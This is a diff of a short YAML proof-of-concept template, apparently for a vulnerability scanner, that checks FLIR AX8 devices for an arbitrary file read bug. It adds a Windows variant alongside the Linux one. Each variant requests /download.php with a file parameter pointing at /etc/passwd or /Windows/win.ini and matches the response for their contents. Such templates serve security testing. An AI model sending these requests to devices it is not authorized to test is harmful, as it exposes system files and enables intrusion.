@@ -1,10 +1,17 @@
 name: poc-yaml-flir-ax8-file-read
-rules:
-  - method: GET
-    path: "/download.php?file=/etc/passwd"
-    follow_redirects: false
-    expression: |
-      response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+groups:
+  Linux:
+    - method: GET
+      path: /download.php?file=/etc/passwd
+      follow_redirects: false
+      expression: |
+        response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+  Windows:
+    - method: GET
+      path: /download.php?file=/Windows/win.ini
+      follow_redirects: false
+      expression: |
+        response.status == 200 && "extensions".bmatches(response.body)
 
 detail:
   author: Print1n(http://print1n.top)
